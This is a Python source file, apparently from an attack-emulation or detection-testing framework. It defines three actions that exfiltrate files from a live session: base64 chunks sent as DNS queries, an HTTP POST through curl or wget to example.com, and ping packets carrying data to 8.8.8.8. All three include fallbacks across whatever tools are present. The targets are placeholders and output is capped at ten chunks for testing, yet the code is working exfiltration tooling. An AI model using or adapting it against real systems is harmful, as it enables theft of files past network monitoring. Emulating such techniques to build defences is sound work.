from .SendFileBase import SendFileBase

class SendFileUDP(SendFileBase):
    """
    Send a file to a remote location via DNS (UDP) exfiltration.
    
    This action sends files using DNS exfiltration (using dig) over UDP.
    Linux only.
    """

    def __init__(self):
        super().__init__("SendFileUDP", "udp")


    def _send_file(self, live_session, file_path: str) -> tuple[str, int, str]:
        """
        Send file via DNS exfiltration using base64 encoding and dig (with nslookup/host fallback).
        """
        # Encode file to base64
        encoded_data, encode_status = self._encode_file(live_session, file_path)
        if encode_status != 0:
            return "Failed to read and encode file", 1, ""
        
        # Split into chunks (DNS labels max 63 chars, use 50 for safety)
        chunk_size = 50
        chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
        
        # Send chunks via DNS queries to a default DNS server
        target_domain = "example.com"
        dns_server = "8.8.8.8"
        
        # Determine which DNS tool to use (try busybox nslookup first since we know it works, then others)
        dns_tool = None
        
        # Check tool availability using which
        check_busybox = live_session.run_command("which busybox 2>&1")
        check_nslookup = live_session.run_command("which nslookup 2>&1")
        check_host = live_session.run_command("which host 2>&1")
        check_getent = live_session.run_command("which getent 2>&1")
        check_python3 = live_session.run_command("which python3 2>&1")
        check_perl = live_session.run_command("which perl 2>&1")
        check_dig = live_session.run_command("which dig 2>&1")
        
        # Try tools in order of preference (busybox first since we know it works)
        if "busybox" in check_busybox and "not found" not in check_busybox.lower():
            dns_tool = ("busybox nslookup", f"busybox nslookup {{query}} {dns_server} 2>&1")
        elif "nslookup" in check_nslookup and "not found" not in check_nslookup.lower():
            dns_tool = ("nslookup", f"nslookup -type=A {{query}} {dns_server} 2>&1")
        elif "host" in check_host and "not found" not in check_host.lower():
            dns_tool = ("host", f"host {{query}} {dns_server} 2>&1")
        elif "getent" in check_getent and "not found" not in check_getent.lower():
            dns_tool = ("getent", f"getent hosts {{query}} 2>&1")
        elif "python3" in check_python3 and "not found" not in check_python3.lower():
            dns_tool = ("python3", f"python3 -c \"import socket; print(socket.gethostbyname('{{query}}'))\" 2>&1")
        elif "perl" in check_perl and "not found" not in check_perl.lower():
            dns_tool = ("perl", f"perl -e \"use Socket; print gethostbyname('{{query}}')\" 2>&1")
        elif "dig" in check_dig and "not found" not in check_dig.lower():
            dns_tool = ("dig", f"dig @{dns_server} {{query}} +short 2>&1")
        
        if not dns_tool:
            return "ERROR: No DNS lookup tools found (dig, nslookup, host, busybox, getent, python3, or perl). Please install one to use DNS/UDP file transfer.", 1, ""
        
        tool_name, tool_cmd_template = dns_tool
        results = []
        
        for i, chunk in enumerate(chunks):
            # Clean chunk for DNS (remove invalid chars)
            clean_chunk = ''.join(c for c in chunk if c.isalnum() or c in ['+', '/', '='])
            
            dns_cmd = tool_cmd_template.format(query=f"{clean_chunk}.{i}.{target_domain}")
            result = live_session.run_command(dns_cmd)
            
            # Check for command not found errors (shouldn't happen after test, but just in case)
            if "not found" in result.lower() or "command not found" in result.lower():
                return f"ERROR: {tool_name} command failed: {result}", 1, target_domain
            
            results.append(result)
            # Limit output to first 10 chunks for testing
            if i >= 9:
                break
        
        output = f"Sent {min(len(chunks), 10)} DNS chunks via UDP to {dns_server}\n" + "\n".join(results[:5])
        exit_status = 0
        return output, exit_status, target_domain



class SendFileHTTP(SendFileBase):
    """
    Send a file to a remote location via HTTP POST.
    
    This action sends files using HTTP POST (using curl) over TCP.
    Linux only.
    """

    def __init__(self):
        super().__init__("SendFileHTTP", "http")

    def _send_file(self, live_session, file_path: str) -> tuple[str, int, str]:
        """
        Send file via HTTP POST using curl, with wget as fallback.
        """
        escaped_path = file_path.replace('"', '\\"')
        target_url = "http://example.com/upload"
        
        # Check if curl is available
        check_curl = live_session.run_command("which curl 2>&1")
        use_curl = "curl" in check_curl and "not found" not in check_curl.lower()
        
        if use_curl:
            # Try curl first
            cmd = f"curl -X POST -F 'file=@{escaped_path}' {target_url} 2>&1"
            output = live_session.run_command(cmd)
            
            # Check for curl errors
            if "not found" in output.lower() or "command not found" in output.lower():
                use_curl = False  # Fall back to wget
            else:
                exit_status = 0 if any(x in output for x in ["200", "201", "success", "OK"]) else 1
                # Extract domain from URL (example.com from http://example.com/upload)
                target_domain = target_url.split("://")[1].split("/")[0]
                return output, exit_status, target_domain
        
        # Fallback to wget if curl failed or not available
        if not use_curl:
            check_wget = live_session.run_command("which wget 2>&1")
            if "wget" not in check_wget or "not found" in check_wget.lower():
                return "ERROR: Neither curl nor wget found. Please install one to use HTTP file transfer.", 1, ""
            
            # wget doesn't support multipart/form-data POST like curl, so we'll use --post-file
            # For a more realistic approach, we could base64 encode and send as data
            cmd = f"wget --post-file='{escaped_path}' {target_url} -O /dev/null 2>&1"
            output = live_session.run_command(cmd)
            
            # Check for wget errors
            if "not found" in output.lower() or "command not found" in output.lower():
                return f"ERROR: wget command failed: {output}", 1, ""
            
            exit_status = 0 if any(x in output for x in ["200", "201", "success", "OK", "saved"]) else 1
            # Extract domain from URL (example.com from http://example.com/upload)
            target_domain = target_url.split("://")[1].split("/")[0]
            return output, exit_status, target_domain
        
        return "ERROR: Failed to send file", 1, ""


class SendFileICMP(SendFileBase):
    """
    Send a file to a remote location via ICMP exfiltration.
    
    This action sends files using ICMP ping packets with data payload.
    Linux only.
    """

    def __init__(self):
        super().__init__("SendFileICMP", "icmp")

    def _send_file(self, live_session, file_path: str) -> tuple[str, int, str]:
        """
        Send file via ICMP exfiltration using ping with data payload.
        """
        encoded_data, encode_status = self._encode_file(live_session, file_path)
        if encode_status != 0:
            return "Failed to read and encode file", 1, ""
        
        chunk_size = 32
        chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
        target_ip = "8.8.8.8"
        
        results = []
        for i, chunk in enumerate(chunks[:10]):  # Limit to 10 for testing
            hex_data = chunk[:8].encode().hex()
            ping_cmd = f"ping -c 1 -p {hex_data} {target_ip} 2>&1"
            result = live_session.run_command(ping_cmd)
            results.append(result)
        
        output = f"Sent {min(len(chunks), 10)} ICMP packets to {target_ip}\n" + "\n".join(results[:3])
        exit_status = 0
        return output, exit_status, target_ip

